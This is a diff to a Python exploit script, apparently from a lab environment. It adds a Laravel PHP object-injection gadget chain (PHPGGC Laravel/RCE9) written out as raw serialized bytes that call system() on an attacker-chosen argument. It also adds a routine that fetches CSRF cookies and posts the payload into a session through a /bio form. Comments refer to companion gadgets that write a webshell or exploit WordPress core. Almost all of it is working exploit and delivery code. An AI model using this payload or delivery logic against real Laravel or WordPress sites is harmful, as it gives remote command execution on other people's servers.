@@ -18,6 +18,7 @@ from __future__ import annotations
 import os
 import socket
 import subprocess
+import urllib.parse
 import time
 import uuid
 
@@ -78,8 +79,9 @@ def set_shell(name: str) -> None:
 
 def set_gadget(name: str, arg: str = "") -> None:
     """Choose the planted record: 'filecache' (lab gadget, writes a
-    webshell) or 'wordpress' (real WP core gadget, runs arg via
-    system() from __destruct)."""
+    webshell), 'wordpress' (WP core gadget) or 'laravel' (PHPGGC
+    Laravel/RCE9 from the framework's own vendor tree) - the last two
+    run arg via system() from __destruct."""
     global GADGET, WP_ARG
     GADGET, WP_ARG = name, arg
 
@@ -94,6 +96,25 @@ SEP = b":" + b'"'
 
 
 def obj_bytes() -> bytes:
+    if GADGET == "laravel":
+        # PHPGGC Laravel/RCE9 (5.4.0 <= 9.1.8+; verified against the
+        # shipped Laravel 11.57 + Monolog 3.13 with --test-payload):
+        # PendingBroadcast::__destruct -> Bus\Dispatcher ->
+        # BroadcastEvent, which calls queueResolver("system") with
+        # BroadcastEvent::$connection as the argument. The \0*\0
+        # prefixes are PHP's protected-property encoding - plain raw
+        # bytes in the session file, fine here because Laravel does
+        # not slash input (no wp_magic_quotes equivalent).
+        arg = WP_ARG.encode()
+        return (b'evil|O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:'
+                b'{s:9:"\x00*\x00events";O:25:"Illuminate\\Bus\\Dispatcher":5:'
+                b'{s:12:"\x00*\x00container";N;s:11:"\x00*\x00pipeline";N;'
+                b's:8:"\x00*\x00pipes";a:0:{}s:11:"\x00*\x00handlers";a:0:{}'
+                b's:16:"\x00*\x00queueResolver";s:6:"system";}'
+                b's:8:"\x00*\x00event";'
+                b'O:38:"Illuminate\\Broadcasting\\BroadcastEvent":1:'
+                b'{s:10:"connection";s:' + str(len(arg)).encode() + SEP
+                + arg + b'";}}')
     if GADGET == "wordpress":
         # PHPGGC WordPress/RCE2: WordPress core's WP_HTML_Token calls
         # $this->on_destroy($this->bookmark_name) from __destruct.
@@ -472,6 +493,44 @@ def build_filename_payload() -> bytes:
 def filename_payload_wire() -> bytes:
     """The payload as it must appear in the multipart header."""
     return escape_filename(build_filename_payload())
+
+
+def laravel_store_bio(sid: str, payload: bytes) -> bytes:
+    """Store the payload on the Laravel target through /bio.
+
+    Laravel's web group runs VerifyCsrfToken, so a bare POST gets a
+    419. This performs exactly the round-trip any real client does:
+    GET / (which issues the XSRF-TOKEN + laravel_session cookies for
+    this session), then POST /bio echoing the XSRF cookie back in the
+    X-XSRF-TOKEN header - Laravel decrypts it server-side and compares
+    it with the session token. No target-side exemption is involved.
+    """
+    # 1) GET / -> Set-Cookie: XSRF-TOKEN=...; laravel_session=...
+    req = (f"GET / HTTP/1.1\r\nHost: localhost\r\n"
+           f"Cookie: PHPSESSID={sid}\r\nConnection: close\r\n\r\n").encode()
+    _, resp = _http(PORT, req, read_resp=True)
+    cookies = {}
+    for line in resp.split(b"\r\n"):
+        if not line.lower().startswith(b"set-cookie:"):
+            continue
+        kv = line.split(b":", 1)[1].strip().split(b";", 1)[0]
+        name, _, value = kv.partition(b"=")
+        cookies[name.decode()] = value.decode()
+    xsrf = cookies.get("XSRF-TOKEN")
+    laravel = cookies.get("laravel_session")
+    if not xsrf or not laravel:
+        raise OSError("laravel target did not issue XSRF cookies")
+
+    # 2) POST /bio with both cookies + the X-XSRF-TOKEN header
+    body = b"bio=" + payload
+    req = (f"POST /bio HTTP/1.1\r\nHost: localhost\r\n"
+           f"Cookie: PHPSESSID={sid}; laravel_session={laravel}\r\n"
+           f"X-XSRF-TOKEN: {urllib.parse.unquote(xsrf)}\r\n"
+           f"Content-Type: application/x-www-form-urlencoded\r\n"
+           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
+           ).encode() + body
+    _, resp = _http(PORT, req, read_resp=True)
+    return resp
 
 
 def consume(sid: str, port: int = PORT, timeout: float = 15.0) -> dict:
